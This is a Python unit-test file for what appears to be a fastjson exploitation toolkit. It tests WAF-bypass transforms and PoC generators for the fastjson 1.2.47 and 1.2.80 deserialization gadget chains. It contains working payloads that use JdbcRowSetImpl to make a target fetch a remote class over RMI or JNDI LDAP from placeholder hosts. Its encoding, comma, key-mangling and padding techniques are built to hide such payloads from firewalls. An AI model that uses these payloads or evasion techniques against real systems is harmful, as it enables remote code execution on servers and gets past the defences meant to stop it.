"""WAF 绕过变换单测（本地字符串变换，不发包）。"""

from fastjson_toolkit.waf import WafOptions, WafRequest, list_techniques, run_waf
from fastjson_toolkit.waf.transforms import apply_technique


SAMPLE = (
    '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
    '"dataSourceName":"rmi://127.0.0.1:1099/Exploit",'
    '"autoCommit":true}'
)


def test_list_techniques():
    ids = {t.id for t in list_techniques()}
    assert {
        "unicode",
        "hex",
        "unicode_hex",
        "unicode_plus",
        "multi_comma",
        "key_underscore",
        "key_hyphen",
        "key_mixed",
        "pad",
        "url_value",
    } <= ids


def test_unicode_hex_mix_matches_note_shape():
    out = apply_technique(SAMPLE, "unicode_hex")
    assert r"\x40\u0074\u0079\u0070\u0065" in out
    assert r"\x63\x6f\x6d\x2e\x73\x75\x6e" in out
    assert "JdbcRowSetImpl" not in out


def test_unicode_plus():
    out = apply_technique('{"@type":"java.lang.AutoCloseable"}', "unicode_plus")
    assert r"\u+40\u+74\u+79\u+70\u+65" in out
    assert r"\u+65" in out  # e
    assert "AutoCloseable" not in out


def test_multi_comma():
    out = apply_technique(SAMPLE, "multi_comma", WafOptions(comma_count=5))
    assert out.startswith("{,,,,,")
    assert ",,,,,," in out or ",,,,,\"" in out or ',,,,,"' in out


def test_key_underscore():
    out = apply_technique(SAMPLE, "key_underscore")
    assert "dataSourceName" not in out or "d_a_t_a" in out
    assert "d_a_t_a" in out or "d_a_t_aSourceName" in out or "d_a_t_a_S" in out
    # @type 默认不改
    assert '"@type"' in out or "'@type'" in out


def test_key_mixed_ge_1236():
    out = apply_technique(SAMPLE, "key_mixed")
    assert "_" in out and "-" in out


def test_pad():
    out = apply_technique(SAMPLE, "pad", WafOptions(pad_size=100, pad_char="a", pad_key="f"))
    assert '"f":"' in out
    assert "a" * 100 in out
    assert out.endswith("}")


def test_url_value():
    src = (
        '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
        '"dataSourceName":"${jndi:ldap://1.1.1.1:1389/EvilObject}",'
        '"autoCommit":true}'
    )
    out = apply_technique(src, "url_value")
    assert "$%7bjndi:ldap://1.1.1.1:1389/EvilObject%7d" in out


def test_stack_and_variants_api():
    stacked = run_waf(
        WafRequest(
            payload=SAMPLE,
            techniques=["key_underscore", "multi_comma"],
            mode="stack",
            options=WafOptions(comma_count=3),
        )
    )
    assert "d_a" in stacked.payload
    assert ",,," in stacked.payload

    variants = run_waf(WafRequest(payload=SAMPLE, techniques=[], mode="variants"))
    assert len(variants.variants) == len(list_techniques())
    assert variants.payload == variants.variants[0].payload


def test_poc_1247_applies_waf():
    from fastjson_toolkit.poc.v1_2_47.service import generate_poc_1247
    from fastjson_toolkit.poc.v1_2_47.models import Poc1247GenerateOptions

    r = generate_poc_1247(
        Poc1247GenerateOptions(
            gadget="jdbc_rowset",
            waf_techniques=["unicode_hex"],
        )
    )
    assert r.waf_techniques == ["unicode_hex"]
    assert r.payload_raw is not None
    assert r"\x40\u0074" in r.payload
    assert r.payload != r.payload_raw


def test_poc_1280_applies_waf_to_steps():
    from fastjson_toolkit.poc.v1_2_80.service import generate_poc_1280
    from fastjson_toolkit.poc.v1_2_80.models import Poc1280GenerateOptions

    r = generate_poc_1280(
        Poc1280GenerateOptions(
            gadget="jackson_cache",
            waf_techniques=["multi_comma"],
            waf_options=WafOptions(comma_count=3),
        )
    )
    assert r.waf_techniques == ["multi_comma"]
    assert r.steps_raw
    assert all(",,," in s or s.startswith("{,,,") for s in r.steps)
